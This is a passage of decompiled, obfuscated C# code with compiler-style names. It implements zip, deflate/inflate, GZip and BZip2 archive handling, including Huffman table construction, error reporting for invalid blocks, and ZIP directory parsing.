					goto IL_E32;
				}
				class41_0.enum16_0 = Class41.Enum16.const_0;
			}
			return Class16.smethod_223(class41_0, int_0);
			Block_45:
			class41_0.enum16_0 = Class41.Enum16.const_9;
			class41_0.gclass2_0.string_0 = "invalid stored block lengths";
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
			Block_51:
			int_0 = -2;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -2);
			IL_8B7:
			num3 >>= 3;
			i -= 3;
			class41_0.enum16_0 = Class41.Enum16.const_9;
			class41_0.gclass2_0.string_0 = "invalid block type";
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
			IL_933:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_9FE:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_A55:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_AAC:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_B03:
			class41_0.enum16_0 = Class41.Enum16.const_9;
			class41_0.gclass2_0.string_0 = "too many length or distance symbols";
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
			IL_B77:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_BCE:
			int_0 = num6;
			if (int_0 == -3)
			{
				class41_0.int_4 = null;
				class41_0.enum16_0 = Class41.Enum16.const_9;
			}
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_C3C:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_C93:
			class41_0.int_4 = null;
			class41_0.enum16_0 = Class41.Enum16.const_9;
			class41_0.gclass2_0.string_0 = "invalid bit length repeat";
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
			IL_D0E:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_D65:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_DBC:
			if (num6 == -3)
			{
				class41_0.int_4 = null;
				class41_0.enum16_0 = Class41.Enum16.const_9;
			}
			int_0 = num6;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_E32:
			class41_0.enum16_0 = Class41.Enum16.const_7;
			IL_E39:
			class41_0.int_13 = num4;
			int_0 = Class16.smethod_223(class41_0, int_0);
			num4 = class41_0.int_13;
			int arg_E72_0 = (num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4);
			if (class41_0.int_12 != class41_0.int_13)
			{
				class41_0.int_9 = num3;
				class41_0.int_8 = i;
				class41_0.gclass2_0.int_1 = num2;
				class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
				class41_0.gclass2_0.int_0 = num;
				class41_0.int_13 = num4;
				return Class16.smethod_223(class41_0, int_0);
			}
			class41_0.enum16_0 = Class41.Enum16.const_8;
			IL_EE0:
			int_0 = 1;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, 1);
			IL_F3A:
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			class41_0.gclass2_0.int_1 = num2;
			class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
			class41_0.gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
		}

		static EventArgs3 smethod_413(string string_0)
		{
			return new EventArgs3(string_0, Enum6.const_11);
		}

		static int smethod_414(byte[] byte_0, Stream stream_0)
		{
			int num = stream_0.Read(byte_0, 0, 12);
			if (num != 12)
			{
				throw new ZipException(string.Format("Unexpected end of data at position 0x{0:X8}", stream_0.Position));
			}
			return num;
		}

		static Stream smethod_415(Stream4 stream4_0)
		{
			return stream4_0.stream_0;
		}

		static GClass0 smethod_416(string string_0, GClass1 gclass1_0, Delegate0 delegate0_0)
		{
			Class16.smethod_441(string_0, gclass1_0);
			return Class16.smethod_104(delegate0_0, gclass1_0, string_0);
		}

		static bool smethod_417(Class39 class39_0)
		{
			return class39_0.bool_1;
		}

		static EventArgs2 smethod_418(string string_0)
		{
			return new EventArgs2(string_0, Enum6.const_0);
		}

		static byte[] smethod_419(Class22 class22_0, byte[] byte_0, int int_0)
		{
			if (byte_0 == null)
			{
				throw new ArgumentNullException("plaintext");
			}
			if (int_0 > byte_0.Length)
			{
				throw new ArgumentOutOfRangeException("length", "Bad length during Encryption: The length parameter must be smaller than or equal to the size of the destination array.");
			}
			byte[] array = new byte[int_0];
			for (int i = 0; i < int_0; i++)
			{
				byte byte_ = byte_0[i];
				array[i] = (byte_0[i] ^ Class16.smethod_336(class22_0));
				Class16.smethod_599(class22_0, byte_);
			}
			return array;
		}

		static void smethod_420(int int_0, GClass1 gclass1_0, bool bool_0, GClass0 gclass0_0)
		{
			EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
			if (eventHandler_ != null)
			{
				EventArgs3 eventArgs = new EventArgs3(gclass1_0.ArchiveNameForEvent, bool_0, gclass1_0.dictionary_0.Count, int_0, gclass0_0);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_8 = true;
				}
			}
		}

		static Stream smethod_421(Stream1 stream1_0)
		{
			return stream1_0.stream_0;
		}

		static object smethod_422(Type type_0, string string_0)
		{
			return Class16.smethod_199(false, string_0, type_0);
		}

		static int smethod_423(int[] int_0, int[] int_1, Class45 class45_0, int[] int_2, int[] int_3, int[] int_4, int[] int_5, int int_6, int[] int_7, int[] int_8, int int_9, int int_10)
		{
			int num = 0;
			int num2 = int_9;
			do
			{
				class45_0.int_8[int_4[int_6 + num]]++;
				num++;
				num2--;
			}
			while (num2 != 0);
			if (class45_0.int_8[0] == int_9)
			{
				int_2[0] = -1;
				int_7[0] = 0;
				return 0;
			}
			int num3 = int_7[0];
			int i = 1;
			while (i <= 15 && class45_0.int_8[i] == 0)
			{
				i++;
			}
			int j = i;
			if (num3 < i)
			{
				num3 = i;
			}
			num2 = 15;
			while (num2 != 0 && class45_0.int_8[num2] == 0)
			{
				num2--;
			}
			int num4 = num2;
			if (num3 > num2)
			{
				num3 = num2;
			}
			int_7[0] = num3;
			int num5 = 1 << i;
			while (i < num2)
			{
				if ((num5 -= class45_0.int_8[i]) < 0)
				{
					return -3;
				}
				i++;
				num5 <<= 1;
			}
			if ((num5 -= class45_0.int_8[num2]) < 0)
			{
				return -3;
			}
			class45_0.int_8[num2] += num5;
			i = (class45_0.int_11[1] = 0);
			num = 1;
			int num6 = 2;
			while (--num2 != 0)
			{
				i = (class45_0.int_11[num6] = i + class45_0.int_8[num]);
				num6++;
				num++;
			}
			num2 = 0;
			num = 0;
			do
			{
				if ((i = int_4[int_6 + num]) != 0)
				{
					int_3[class45_0.int_11[i]++] = num2;
				}
				num++;
			}
			while (++num2 < int_9);
			int_9 = class45_0.int_11[num4];
			num2 = (class45_0.int_11[0] = 0);
			num = 0;
			int num7 = -1;
			int num8 = -num3;
			class45_0.int_10[0] = 0;
			int num9 = 0;
			int num10 = 0;
			while (j <= num4)
			{
				int num11 = class45_0.int_8[j];
				while (num11-- != 0)
				{
					int num12;
					while (j > num8 + num3)
					{
						num7++;
						num8 += num3;
						num10 = num4 - num8;
						num10 = ((num10 > num3) ? num3 : num10);
						if ((num12 = 1 << ((i = j - num8) & 31)) > num11 + 1)
						{
							num12 -= num11 + 1;
							num6 = j;
							if (i < num10)
							{
								while (++i < num10 && (num12 <<= 1) > class45_0.int_8[++num6])
								{
									num12 -= class45_0.int_8[num6];
								}
							}
						}
						num10 = 1 << i;
						if (int_5[0] + num10 > 1440)
						{
							return -3;
						}
						num9 = (class45_0.int_10[num7] = int_5[0]);
						int_5[0] += num10;
						if (num7 != 0)
						{
							class45_0.int_11[num7] = num2;
							class45_0.int_9[0] = (int)((sbyte)i);
							class45_0.int_9[1] = (int)((sbyte)num3);
							i = (int)((uint)num2 >> num8 - num3);
							class45_0.int_9[2] = num9 - class45_0.int_10[num7 - 1] - i;
							Array.Copy(class45_0.int_9, 0, int_1, (class45_0.int_10[num7 - 1] + i) * 3, 3);
						}
						else
						{
							int_2[0] = num9;
						}
					}
					class45_0.int_9[1] = (int)((sbyte)(j - num8));
					if (num >= int_9)
					{
						class45_0.int_9[0] = 192;
					}
					else if (int_3[num] < int_10)
					{
						class45_0.int_9[0] = (int)((int_3[num] < 256) ? 0 : 96);
						class45_0.int_9[2] = int_3[num++];
					}
					else
					{
						class45_0.int_9[0] = (int)((sbyte)(int_8[int_3[num] - int_10] + 16 + 64));
						class45_0.int_9[2] = int_0[int_3[num++] - int_10];
					}
					num12 = 1 << j - num8;
					for (i = (int)((uint)num2 >> num8); i < num10; i += num12)
					{
						Array.Copy(class45_0.int_9, 0, int_1, (num9 + i) * 3, 3);
					}
					i = 1 << j - 1;
					while ((num2 & i) != 0)
					{
						num2 ^= i;
						i = (int)((uint)i >> 1);
					}
					num2 ^= i;
					int num13 = (1 << num8) - 1;
					while ((num2 & num13) != class45_0.int_11[num7])
					{
						num7--;
						num8 -= num3;
						num13 = (1 << num8) - 1;
					}
				}
				j++;
			}
			if (num5 != 0)
			{
				if (num4 != 1)
				{
					return -5;
				}
			}
			return 0;
		}

		static void smethod_424(string string_0, Stream10 stream10_0)
		{
			if (stream10_0.bool_0)
			{
				throw new ObjectDisposedException("GZipStream");
			}
			stream10_0.string_0 = string_0;
			if (stream10_0.string_0 == null)
			{
				return;
			}
			if (stream10_0.string_0.IndexOf("/") != -1)
			{
				stream10_0.string_0 = stream10_0.string_0.Replace("/", "\\");
			}
			if (stream10_0.string_0.EndsWith("\\"))
			{
				throw new Exception("Illegal filename");
			}
			if (stream10_0.string_0.IndexOf("\\") != -1)
			{
				stream10_0.string_0 = Path.GetFileName(stream10_0.string_0);
			}
		}

		static void smethod_425(Class33 class33_0)
		{
			bool[] bool_ = class33_0.class34_0.bool_0;
			byte[] byte_ = class33_0.class34_0.byte_6;
			int int_ = class33_0.int_3;
			int num = 256;
			while (--num >= 0)
			{
				bool_[num] = false;
			}
			int num2 = 0;
			int num3 = 0;
			int i = 0;
			int num4 = 1;
			while (i <= int_)
			{
				if (num2 == 0)
				{
					num2 = (int)((ushort)Class16.smethod_544(num3));
					if (++num3 == 512)
					{
						num3 = 0;
					}
				}
				num2--;
				byte[] expr_6E_cp_0 = byte_;
				int expr_6E_cp_1 = num4;
				expr_6E_cp_0[expr_6E_cp_1] ^= ((num2 == 1) ? 1 : 0);
				bool_[(int)(byte_[num4] & 255)] = true;
				i = num4;
				num4++;
			}
			class33_0.bool_1 = true;
		}

		static void smethod_426(Class39 class39_0, int int_0, int int_1, bool bool_0)
		{
			Class16.smethod_371(class39_0, (Class39.int_7 << 1) + (bool_0 ? 1 : 0), 3);
			Class16.smethod_13(int_0, true, int_1, class39_0);
		}

		static int smethod_427(Class20 class20_0)
		{
			return class20_0.int_0 / 8;
		}

		static Stream smethod_428(string string_0, uint uint_0)
		{
			if (uint_0 >= 99u)
			{
				throw new ArgumentOutOfRangeException("diskNumber");
			}
			string path = string.Format("{0}.z{1:D2}", Path.Combine(Path.GetDirectoryName(string_0), Path.GetFileNameWithoutExtension(string_0)), uint_0 + 1u);
			return File.Open(path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}

		static Enum8 smethod_429(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.enum8_0;
			}
			return class8_0.stream0_0.enum8_0;
		}

		static void smethod_430(Stream6 stream6_0)
		{
			stream6_0.uint_1 = Class16.smethod_286(stream6_0);
			stream6_0.enum11_0 = Stream6.Enum11.const_0;
			stream6_0.class35_0 = null;
			if (stream6_0.uint_1 != stream6_0.uint_3)
			{
				string message = string.Format("BZip2 CRC error (expected {0:X8}, computed {1:X8})", stream6_0.uint_1, stream6_0.uint_3);
				throw new IOException(message);
			}
		}

		static void smethod_431(Form1.Class1 class1_0)
		{
			class1_0.int_0 = -1;
			if (class1_0.ienumerator_0 != null)
			{
				class1_0.ienumerator_0.Dispose();
			}
		}

		static string smethod_432()
		{
			return Class16.smethod_325("");
		}

		static int smethod_433(Class39 class39_0)
		{
			short[] short_ = class39_0.short_2;
			int int_ = class39_0.class47_0.int_6;
			Class16.smethod_633(short_, int_, class39_0);
			short_ = class39_0.short_3;
			int_ = class39_0.class47_1.int_6;
			Class16.smethod_633(short_, int_, class39_0);
			Class16.smethod_273(class39_0.class47_2, class39_0);
			int num = Class49.int_1 - 1;
			while (num >= 3 && class39_0.short_4[(int)(Class47.sbyte_0[num] * 2 + 1)] == 0)
			{
				num--;
			}
			class39_0.int_47 += 3 * (num + 1) + 5 + 5 + 4;
			return num;
		}

		static int smethod_434(Stream6 stream6_0, int int_0)
		{
			int num = stream6_0.int_4;
			int num2 = stream6_0.int_3;
			if (num < int_0)
			{
				while (true)
				{
					int num3 = stream6_0.stream_0.ReadByte();
					if (num3 < 0)
					{
						break;
					}
					num2 = (num2 << 8 | num3);
					num += 8;
					if (num >= int_0)
					{
						goto IL_3D;
					}
				}
				throw new IOException("unexpected end of stream");
				IL_3D:
				stream6_0.int_3 = num2;
			}
			stream6_0.int_4 = num - int_0;
			return num2 >> num - int_0 & (1 << int_0) - 1;
		}

		static void smethod_435(GClass1 gclass1_0)
		{
			Stream readStream = gclass1_0.ReadStream;
			try
			{
				gclass1_0.string_1 = gclass1_0.string_0;
				if (!readStream.CanSeek)
				{
					Class16.smethod_181(gclass1_0);
					return;
				}
				Class16.smethod_218(gclass1_0);
				uint num = Class16.smethod_300(readStream);
				if (num == 101010256u)
				{
					return;
				}
				int num2 = 0;
				bool flag = false;
				long num3 = readStream.Length - 64L;
				long num4 = Math.Max(readStream.Length - 16384L, 10L);
				do
				{
					if (num3 < 0L)
					{
						num3 = 0L;
					}
					readStream.Seek(num3, SeekOrigin.Begin);
					long num5 = Class16.smethod_581(readStream, 101010256);
					if (num5 != -1L)
					{
						flag = true;
					}
					else
					{
						if (num3 == 0L)
						{
							break;
						}
						num2++;
						num3 -= (long)(32 * (num2 + 1) * num2);
					}
					if (flag)
					{
						break;
					}
				}
				while (num3 > num4);
				if (flag)
				{
					gclass1_0.long_0 = readStream.Position - 4L;
					byte[] array = new byte[16];
					readStream.Read(array, 0, array.Length);
					gclass1_0.uint_0 = (uint)BitConverter.ToUInt16(array, 2);
					if (gclass1_0.uint_0 == 65535u)
					{
						throw new ZipException("Spanned archives with more than 65534 segments are not supported at this time.");
					}
					gclass1_0.uint_0 += 1u;
					uint num6 = BitConverter.ToUInt32(array, 12);
					if (num6 == 4294967295u)
					{
						Class16.smethod_550(gclass1_0);
					}
					else
					{
						gclass1_0.uint_2 = num6;
						readStream.Seek((long)((ulong)num6), SeekOrigin.Begin);
					}
					Class16.smethod_235(gclass1_0);
				}
				else
				{
					readStream.Seek(0L, SeekOrigin.Begin);
					Class16.smethod_181(gclass1_0);
				}
			}
			catch (Exception exception_)
			{
				if (gclass1_0.bool_7 && gclass1_0.stream_0 != null)
				{
					gclass1_0.stream_0.Dispose();
					gclass1_0.stream_0 = null;
				}
				throw new ZipException("Cannot read that as a ZipFile", exception_);
			}
			gclass1_0.bool_5 = false;
		}

		static int smethod_436(int[] int_0, int[] int_1, int[] int_2, int[] int_3, GClass2 gclass2_0, Class45 class45_0)
		{
			Class16.smethod_310(class45_0, 19);
			class45_0.int_6[0] = 0;
			int[] int_4 = class45_0.int_6;
			int[] int_5 = class45_0.int_7;
			int num = Class16.smethod_423(null, int_2, class45_0, int_0, int_5, int_3, int_4, 0, int_1, null, 19, 19);
			if (num == -3)
			{
				gclass2_0.string_0 = "oversubscribed dynamic bit lengths tree";
			}
			else if (num == -5 || int_1[0] == 0)
			{
				gclass2_0.string_0 = "incomplete dynamic bit lengths tree";
				num = -3;
			}
			return num;
		}

		static bool smethod_437(Class74.Class76 class76_0)
		{
			return class76_0.int_0 == class76_0.int_1;
		}

		static int smethod_438(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
		{
			if (short_0 != 32)
			{
				throw new BadReadException(string.Format("  Unexpected size (0x{0:X4}) for NTFS times extra field at position 0x{1:X16}", short_0, long_0));
			}
			int_0 += 4;
			short num = (short)((int)byte_0[int_0] + (int)byte_0[int_0 + 1] * 256);
			short num2 = (short)((int)byte_0[int_0 + 2] + (int)byte_0[int_0 + 3] * 256);
			int_0 += 4;
			if (num == 1 && num2 == 24)
			{
				long fileTime = BitConverter.ToInt64(byte_0, int_0);
				gclass0_0.dateTime_1 = DateTime.FromFileTimeUtc(fileTime);
				int_0 += 8;
				fileTime = BitConverter.ToInt64(byte_0, int_0);
				gclass0_0.dateTime_2 = DateTime.FromFileTimeUtc(fileTime);
				int_0 += 8;
				fileTime = BitConverter.ToInt64(byte_0, int_0);
				gclass0_0.dateTime_3 = DateTime.FromFileTimeUtc(fileTime);
				int_0 += 8;
				gclass0_0.bool_0 = true;
				gclass0_0.enum7_0 |= Enum7.flag_2;
				gclass0_0.bool_1 = true;
			}
			return int_0;
		}

		static IPEndPoint smethod_439(Class54 class54_0)
		{
			return class54_0.ipendPoint_0;
		}

		static GClass1 smethod_440(Stream stream_0, TextWriter textWriter_0, Encoding encoding_0, EventHandler<EventArgs1> eventHandler_0)
		{
			if (stream_0 == null)
			{
				throw new ArgumentNullException("zipStream");
			}
			GClass1 gClass = new GClass1();
			gClass.textWriter_0 = textWriter_0;
			gClass.encoding_0 = (encoding_0 ?? GClass1.encoding_1);
			gClass.enum9_0 = Enum9.const_3;
			if (eventHandler_0 != null)
			{
				gClass.ReadProgress += eventHandler_0;
			}
			gClass.stream_0 = ((stream_0.Position == 0L) ? stream_0 : new Stream2(stream_0));
			gClass.bool_7 = false;
			if (gClass.textWriter_0 != null)
			{
				gClass.textWriter_0.WriteLine("reading from stream...");
			}
			Class16.smethod_435(gClass);
			return gClass;
		}

		static void smethod_441(string string_0, GClass1 gclass1_0)
		{
			if (string.IsNullOrEmpty(string_0))
			{
				throw new ArgumentNullException("entryName");
			}
			string string_ = null;
			if (string_0.IndexOf('\\') != -1)
			{
				string_ = Path.GetDirectoryName(string_0);
				string_0 = Path.GetFileName(string_0);
			}
			string text = Class16.smethod_504(string_0, string_);
			if (gclass1_0[text] != null)
			{
				Class16.smethod_542(gclass1_0, text);
			}
		}

		static void smethod_442(Class32 class32_0)
		{
			Class16.smethod_478(class32_0, 0, 0u);
		}

		static GClass0 smethod_443(string string_0, GClass1 gclass1_0)
		{
			return Class16.smethod_655(gclass1_0, string_0, null);
		}

		static GClass0 smethod_444(GClass1 gclass1_0, string string_0)
		{
			return Class16.smethod_670(gclass1_0, string_0, null);
		}

		static IEnumerable<string> smethod_445(string string_0)
		{
			return new Form1.Class1(-2)
			{
				string_2 = string_0
			};
		}

		static void smethod_446(bool bool_0, string string_0, GClass1 gclass1_0, string string_1, string string_2, bool bool_1)
		{
			if (string_2 == null && Directory.Exists(string_0))
			{
				string_2 = string_0;
				string_0 = "*.*";
			}
			else if (string.IsNullOrEmpty(string_2))
			{
				string_2 = ".";
			}
			while (string_2.EndsWith("\\"))
			{
				string_2 = string_2.Substring(0, string_2.Length - 1);
			}
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("adding selection '{0}' from dir '{1}'...", string_0, string_2);
			}
			Class17 class17_ = new Class17(string_0, gclass1_0.AddDirectoryWillTraverseReparsePoints);
			ReadOnlyCollection<string> readOnlyCollection = Class16.smethod_597(bool_1, class17_, string_2);
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("found {0} files...", readOnlyCollection.Count);
			}
			Class16.smethod_228(gclass1_0);
			Enum10 enum10_ = bool_0 ? Enum10.const_1 : Enum10.const_0;
			foreach (string current in readOnlyCollection)
			{
				string string_3 = (string_1 == null) ? null : Class16.smethod_559(string_2, Path.GetDirectoryName(current), string_1);
				if (File.Exists(current))
				{
					if (bool_0)
					{
						Class16.smethod_670(gclass1_0, current, string_3);
					}
					else
					{
						Class16.smethod_655(gclass1_0, current, string_3);
					}
				}
				else
				{
					Class16.smethod_78(gclass1_0, current, string_3, enum10_, false, 0);
				}
			}
			Class16.smethod_209(gclass1_0);
		}

		static void smethod_447(int int_0, byte[] byte_0, Stream3 stream3_0, int int_1)
		{
			int num = int_1;
			int num2 = int_0 + int_1;
			while (num < byte_0.Length && num < num2)
			{
				Class16.smethod_555(stream3_0, byte_0, num);
				num += 16;
			}
		}

		static void smethod_448(Stream11 stream11_0, bool bool_0)
		{
			if (stream11_0.bool_2)
			{
				throw new InvalidOperationException();
			}
			if (stream11_0.bool_1)
			{
				return;
			}
			if (stream11_0.int_4 >= 0)
			{
				Class46 object_ = stream11_0.list_0[stream11_0.int_4];
				stream11_0.method_4(object_);
				stream11_0.int_4 = -1;
			}
			if (bool_0)
			{
				Class16.smethod_357(stream11_0, true, false);
				Class16.smethod_484(stream11_0);
				return;
			}
			Class16.smethod_357(stream11_0, false, false);
		}

		static void smethod_449(Stream stream_0, GClass0 gclass0_0)
		{
			Stream stream = null;
			long long_ = -1L;
			try
			{
				long_ = stream_0.Position;
			}
			catch (Exception)
			{
			}
			try
			{
				long num = Class16.smethod_191(gclass0_0, ref stream);
				Stream4 stream2 = new Stream4(stream_0);
				Stream stream3;
				Stream stream4;
				if (num != 0L)
				{
					stream3 = Class16.smethod_254(stream2, gclass0_0);
					stream4 = Class16.smethod_153(num, gclass0_0, stream3);
				}
				else
				{
					stream4 = (stream3 = stream2);
				}
				Stream13 stream5 = new Stream13(stream4, true);
				if (gclass0_0.enum0_0 == Enum0.const_4)
				{
					gclass0_0.delegate0_0(gclass0_0.string_1, stream5);
				}
				else
				{
					byte[] array = new byte[gclass0_0.BufferSize];
					int count;
					while ((count = Class16.smethod_636(stream, array, 0, array.Length, gclass0_0.string_1)) != 0)
					{
						stream5.Write(array, 0, count);
						Class16.smethod_242(Class16.smethod_22(stream5), num, gclass0_0);
						if (gclass0_0.bool_12)
						{
							break;
						}
					}
				}
				Class16.smethod_343(gclass0_0, stream_0, stream2, stream3, stream4, stream5);
			}
			finally
			{
				if (gclass0_0.enum0_0 == Enum0.const_5)
				{
					if (gclass0_0.delegate2_0 != null)
					{
						gclass0_0.delegate2_0(gclass0_0.string_1, stream);
					}
				}
				else if (stream is FileStream)
				{
					stream.Dispose();
				}
			}
			if (gclass0_0.bool_12)
			{
				return;
			}
			gclass0_0.long_3 = long_;
			Class16.smethod_378(stream_0, gclass0_0);
		}

		static void smethod_450(GClass1 gclass1_0)
		{
			byte[] array = new byte[2];
			gclass1_0.ReadStream.Read(array, 0, array.Length);
			short num = (short)((int)array[0] + (int)array[1] * 256);
			if (num > 0)
			{
				array = new byte[(int)num];
				gclass1_0.ReadStream.Read(array, 0, array.Length);
				string @string = gclass1_0.encoding_0.GetString(array, 0, array.Length);
				gclass1_0.Comment = @string;
			}
		}

		static int smethod_451(int int_0, bool bool_0, GClass2 gclass2_0)
		{
			gclass2_0.int_4 = int_0;
			if (gclass2_0.class39_0 != null)
			{
				throw new GException0("You may not call InitializeInflate() after calling InitializeDeflate().");
			}
			gclass2_0.class44_0 = new Class44(bool_0);
			return Class16.smethod_583(int_0, gclass2_0, gclass2_0.class44_0);
		}

		static void smethod_452(Class15 class15_0, Class9 class9_0)
		{
			class15_0.class9_1 = class9_0;
			if (class9_0 == null)
			{
				class15_0.logicalConjunction_0 = LogicalConjunction.NONE;
				return;
			}
			if (class15_0.logicalConjunction_0 == LogicalConjunction.NONE)
			{
				class15_0.logicalConjunction_0 = LogicalConjunction.AND;
			}
		}

		static ZipSegmentedStream smethod_453(string string_0, uint uint_0, uint uint_1)
		{
			ZipSegmentedStream zipSegmentedStream = new ZipSegmentedStream();
			zipSegmentedStream.rwMode_0 = ZipSegmentedStream.RwMode.ReadOnly;
			Class16.smethod_472(zipSegmentedStream, uint_0);
			zipSegmentedStream.uint_1 = uint_1;
			zipSegmentedStream.string_0 = string_0;
			ZipSegmentedStream zipSegmentedStream2 = zipSegmentedStream;
			Class16.smethod_38(zipSegmentedStream2);
			return zipSegmentedStream2;
		}

		static int smethod_454(Class41 class41_0, int int_0, int[] int_1, Class43 class43_0, int int_2, int int_3, GClass2 gclass2_0, int[] int_4, int int_5)
		{
			int num = gclass2_0.int_0;
			int num2 = gclass2_0.int_1;
			int num3 = class41_0.int_9;
			int i = class41_0.int_8;
			int num4 = class41_0.int_13;
			int num5 = (num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4);
			int num6 = Class42.int_0[int_3];
			int num7 = Class42.int_0[int_5];
			int num10;
			int num11;
			while (true)
			{
				if (i >= 20)
				{
					int num8 = num3 & num6;
					int num9 = (int_2 + num8) * 3;
					if ((num10 = int_4[num9]) == 0)
					{
						num3 >>= int_4[num9 + 1];
						i -= int_4[num9 + 1];
						class41_0.byte_0[num4++] = (byte)int_4[num9 + 2];
						num5--;
					}
					else
					{
						while (true)
						{
							num3 >>= int_4[num9 + 1];
							i -= int_4[num9 + 1];
							if ((num10 & 16) != 0)
							{
								break;
							}
							if ((num10 & 64) != 0)
							{
								goto IL_52A;
							}
							num8 += int_4[num9 + 2];
							num8 += (num3 & Class42.int_0[num10]);
							num9 = (int_2 + num8) * 3;
							if ((num10 = int_4[num9]) == 0)
							{
								goto IL_3D2;
							}
						}
						num10 &= 15;
						num11 = int_4[num9 + 2] + (num3 & Class42.int_0[num10]);
						num3 >>= num10;
						for (i -= num10; i < 15; i += 8)
						{
							num2--;
							num3 |= (int)(gclass2_0.byte_0[num++] & 255) << i;
						}
						num8 = (num3 & num7);
						num9 = (int_0 + num8) * 3;
						num10 = int_1[num9];
						while (true)
						{
							num3 >>= int_1[num9 + 1];
							i -= int_1[num9 + 1];
							if ((num10 & 16) != 0)
							{
								break;
							}
							if ((num10 & 64) != 0)
							{
								goto IL_429;
							}
							num8 += int_1[num9 + 2];
							num8 += (num3 & Class42.int_0[num10]);
